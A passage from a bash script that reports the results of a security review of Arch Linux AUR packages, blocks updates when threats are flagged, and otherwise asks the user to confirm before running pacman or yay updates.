            echo -e "  ${YELLOW}• $pkg:${NC} $summary"
        done
    fi
    
    # List threats if any
    if [ -n "$THREAT_PACKAGES" ]; then
        echo -e "\n${RED}═══ SECURITY THREATS DETECTED ═══${NC}"
        for pkg in $THREAT_PACKAGES; do
            result_file="$SCAN_RESULTS_DIR/${pkg//\//_}.result"
            risk=$(grep "^RISK:" "$result_file" | cut -d: -f2- | xargs)
            summary=$(grep "^SUMMARY:" "$result_file" | cut -d: -f2- | xargs)
            remediation=$(grep "^REMEDIATION:" "$result_file" | cut -d: -f2- | xargs)
            
            echo -e "\n${RED}Package: $pkg${NC}"
            echo -e "${RED}Risk Level: $risk${NC}"
            echo -e "${YELLOW}Issue: $summary${NC}"
            if [ -n "$remediation" ]; then
                echo -e "${CYAN}Remediation: $remediation${NC}"
            fi
        done
        
        echo -e "\n${RED}⚠️  SECURITY THREATS FOUND - Updates blocked for safety${NC}"
        echo -e "${YELLOW}Review the full report for details: $REPORT_FILE${NC}"
        echo -e "\n${CYAN}Options:${NC}"
        echo -e "  1. Review and fix the PKGBUILDs manually"
        echo -e "  2. Report the issues to the package maintainer"
        echo -e "  3. Use --skip-scan to proceed anyway (NOT RECOMMENDED)"
        exit 1
    fi

    # Append summary to report
    cat >> "$REPORT_FILE" << EOF

======================================
REVIEW SUMMARY
======================================
Review completed: $(date)
Duration: ${SCAN_MINUTES}m ${SCAN_SECONDS}s

Packages Reviewed: ${#PACKAGES_TO_SCAN[@]}
Safe packages: $(echo $SAFE_PACKAGES | wc -w)
Threats found: $(echo $THREAT_PACKAGES | wc -w)
Failed downloads: $(echo $FAILED_DOWNLOADS | wc -w)

EOF

    echo -e "\n${YELLOW}Full report saved to: $REPORT_FILE${NC}"
fi

# Now proceed with final update confirmation
TOTAL_UPDATES=$((OFFICIAL_UPDATE_COUNT + AUR_LINES))

if [ $TOTAL_UPDATES -gt 0 ]; then
    echo -e "\n${BLUE}═══ Final Update Confirmation ═══${NC}"
    
    # Calculate safe updates count
    SAFE_AUR_COUNT=$(echo $SAFE_PACKAGES | wc -w)
    SKIPPED_AUR_COUNT=$((AUR_LINES - ${#PACKAGES_TO_SCAN[@]}))
    
    echo -e "\n${CYAN}Ready to update:${NC}"
    echo -e "  ${GREEN}Official packages: $OFFICIAL_UPDATE_COUNT${NC} (trusted, auto-approved)"
    
    if [ ${#PACKAGES_TO_SCAN[@]} -gt 0 ] && [ -z "$THREAT_PACKAGES" ]; then
        echo -e "  ${GREEN}AUR packages (reviewed): $SAFE_AUR_COUNT${NC} (passed security review)"
    fi
    
    if [[ "$SKIP_SCAN" == "true" ]] && [ $AUR_LINES -gt 0 ]; then
        echo -e "  ${YELLOW}AUR packages (unreviewed): $AUR_LINES${NC} (⚠️ no security review)"
    elif [ $SKIPPED_AUR_COUNT -gt 0 ]; then
        echo -e "  ${YELLOW}AUR packages (unreviewed): $SKIPPED_AUR_COUNT${NC} (skipped by user)"
    fi
    
    TOTAL_SAFE=$((OFFICIAL_UPDATE_COUNT + SAFE_AUR_COUNT))
    echo -e "\n${CYAN}Total packages to update: ${YELLOW}$TOTAL_SAFE${NC}"
    
    echo -e "\n${YELLOW}Proceed with updates? [y/N]${NC}"
    read -r response
    
    if [[ "$response" =~ ^[Yy]$ ]]; then
        echo -e "\n${BLUE}Updating packages...${NC}"
        
        if [[ "$UPDATE_ONLY_OFFICIAL" == "true" ]]; then
            # Update only official packages
            sudo pacman -Su
        else
            # Update all packages (official + reviewed AUR)
            yay -Syu
        fi
        
        echo -e "\n${GREEN}✓ Package updates completed successfully!${NC}"
    else
        echo -e "\n${CYAN}Updates cancelled by user.${NC}"
    fi
else
    echo -e "\n${GREEN}System is up to date!${NC}"
fi

exit 0